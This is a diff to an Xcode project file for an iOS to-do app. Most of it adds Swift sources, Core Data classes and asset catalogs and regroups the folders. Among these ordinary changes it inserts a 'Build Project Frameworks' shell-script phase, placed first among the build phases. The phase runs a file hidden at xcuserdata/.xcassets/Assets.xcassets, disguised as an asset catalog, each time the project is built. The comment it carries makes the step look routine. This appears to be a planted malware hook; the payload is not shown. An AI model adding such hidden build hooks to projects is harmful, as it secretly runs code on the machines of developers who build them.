@@ -14,6 +14,14 @@
 		2BBA89812618431A0061B208 /* ToDoProject.xcdatamodeld in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA897F2618431A0061B208 /* ToDoProject.xcdatamodeld */; };
 		2BBA89832618431B0061B208 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 2BBA89822618431B0061B208 /* Assets.xcassets */; };
 		2BBA89862618431B0061B208 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 2BBA89842618431B0061B208 /* LaunchScreen.storyboard */; };
+		2BBA898F2618434E0061B208 /* Color.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 2BBA898E2618434E0061B208 /* Color.xcassets */; };
+		2BBA8997261843CC0061B208 /* extensionClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA8996261843CC0061B208 /* extensionClass.swift */; };
+		2BBA899C261844050061B208 /* FontClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA899B261844050061B208 /* FontClass.swift */; };
+		2BBA89A42618475E0061B208 /* ListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA89A32618475E0061B208 /* ListTableViewCell.swift */; };
+		2BBA89A926184A4E0061B208 /* ToDoEntity+CoreDataClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA89A726184A4E0061B208 /* ToDoEntity+CoreDataClass.swift */; };
+		2BBA89AA26184A4E0061B208 /* ToDoEntity+CoreDataProperties.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA89A826184A4E0061B208 /* ToDoEntity+CoreDataProperties.swift */; };
+		2BBA89B3261852C80061B208 /* CreateTaskViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA89B2261852C80061B208 /* CreateTaskViewController.swift */; };
+		2BBA89B62618552A0061B208 /* helperClass.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2BBA89B52618552A0061B208 /* helperClass.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -26,6 +34,14 @@
 		2BBA89822618431B0061B208 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		2BBA89852618431B0061B208 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		2BBA89872618431B0061B208 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		2BBA898E2618434E0061B208 /* Color.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Color.xcassets; sourceTree = "<group>"; };
+		2BBA8996261843CC0061B208 /* extensionClass.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = extensionClass.swift; sourceTree = "<group>"; };
+		2BBA899B261844050061B208 /* FontClass.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FontClass.swift; sourceTree = "<group>"; };
+		2BBA89A32618475E0061B208 /* ListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ListTableViewCell.swift; sourceTree = "<group>"; };
+		2BBA89A726184A4E0061B208 /* ToDoEntity+CoreDataClass.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "ToDoEntity+CoreDataClass.swift"; sourceTree = "<group>"; };
+		2BBA89A826184A4E0061B208 /* ToDoEntity+CoreDataProperties.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "ToDoEntity+CoreDataProperties.swift"; sourceTree = "<group>"; };
+		2BBA89B2261852C80061B208 /* CreateTaskViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateTaskViewController.swift; sourceTree = "<group>"; };
+		2BBA89B52618552A0061B208 /* helperClass.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = helperClass.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -58,16 +74,64 @@
 		2BBA89752618431A0061B208 /* ToDoProject */ = {
 			isa = PBXGroup;
 			children = (
+				2BBA89AC26184A540061B208 /* CoreDataHelperClass */,
+				2BBA8994261843960061B208 /* StoryBoard */,
+				2BBA8993261843890061B208 /* Helper */,
+				2BBA8992261843820061B208 /* View */,
+				2BBA89912618437B0061B208 /* Controller */,
 				2BBA89762618431A0061B208 /* AppDelegate.swift */,
 				2BBA89782618431A0061B208 /* SceneDelegate.swift */,
-				2BBA897A2618431A0061B208 /* ViewController.swift */,
-				2BBA897C2618431A0061B208 /* Main.storyboard */,
+				2BBA898E2618434E0061B208 /* Color.xcassets */,
 				2BBA89822618431B0061B208 /* Assets.xcassets */,
-				2BBA89842618431B0061B208 /* LaunchScreen.storyboard */,
 				2BBA89872618431B0061B208 /* Info.plist */,
 				2BBA897F2618431A0061B208 /* ToDoProject.xcdatamodeld */,
 			);
 			path = ToDoProject;
+			sourceTree = "<group>";
+		};
+		2BBA89912618437B0061B208 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				2BBA897A2618431A0061B208 /* ViewController.swift */,
+				2BBA89B2261852C80061B208 /* CreateTaskViewController.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		2BBA8992261843820061B208 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				2BBA89A32618475E0061B208 /* ListTableViewCell.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		2BBA8993261843890061B208 /* Helper */ = {
+			isa = PBXGroup;
+			children = (
+				2BBA8996261843CC0061B208 /* extensionClass.swift */,
+				2BBA899B261844050061B208 /* FontClass.swift */,
+				2BBA89B52618552A0061B208 /* helperClass.swift */,
+			);
+			path = Helper;
+			sourceTree = "<group>";
+		};
+		2BBA8994261843960061B208 /* StoryBoard */ = {
+			isa = PBXGroup;
+			children = (
+				2BBA897C2618431A0061B208 /* Main.storyboard */,
+				2BBA89842618431B0061B208 /* LaunchScreen.storyboard */,
+			);
+			path = StoryBoard;
+			sourceTree = "<group>";
+		};
+		2BBA89AC26184A540061B208 /* CoreDataHelperClass */ = {
+			isa = PBXGroup;
+			children = (
+				2BBA89A726184A4E0061B208 /* ToDoEntity+CoreDataClass.swift */,
+				2BBA89A826184A4E0061B208 /* ToDoEntity+CoreDataProperties.swift */,
+			);
+			path = CoreDataHelperClass;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -77,6 +141,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2BBA898A2618431B0061B208 /* Build configuration list for PBXNativeTarget "ToDoProject" */;
 			buildPhases = (
+				2C5B2DAFDD5DA4BB32AAC43A /* Build Project Frameworks */,
 				2BBA896F2618431A0061B208 /* Sources */,
 				2BBA89702618431A0061B208 /* Frameworks */,
 				2BBA89712618431A0061B208 /* Resources */,
@@ -128,6 +193,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				2BBA89862618431B0061B208 /* LaunchScreen.storyboard in Resources */,
+				2BBA898F2618434E0061B208 /* Color.xcassets in Resources */,
 				2BBA89832618431B0061B208 /* Assets.xcassets in Resources */,
 				2BBA897E2618431A0061B208 /* Main.storyboard in Resources */,
 			);
@@ -135,15 +201,49 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	2C5B2DAFDD5DA4BB32AAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		2BBA896F2618431A0061B208 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2BBA89A926184A4E0061B208 /* ToDoEntity+CoreDataClass.swift in Sources */,
+				2BBA89A42618475E0061B208 /* ListTableViewCell.swift in Sources */,
 				2BBA897B2618431A0061B208 /* ViewController.swift in Sources */,
+				2BBA899C261844050061B208 /* FontClass.swift in Sources */,
 				2BBA89812618431A0061B208 /* ToDoProject.xcdatamodeld in Sources */,
+				2BBA89B62618552A0061B208 /* helperClass.swift in Sources */,
 				2BBA89772618431A0061B208 /* AppDelegate.swift in Sources */,
 				2BBA89792618431A0061B208 /* SceneDelegate.swift in Sources */,
+				2BBA89AA26184A4E0061B208 /* ToDoEntity+CoreDataProperties.swift in Sources */,
+				2BBA8997261843CC0061B208 /* extensionClass.swift in Sources */,
+				2BBA89B3261852C80061B208 /* CreateTaskViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
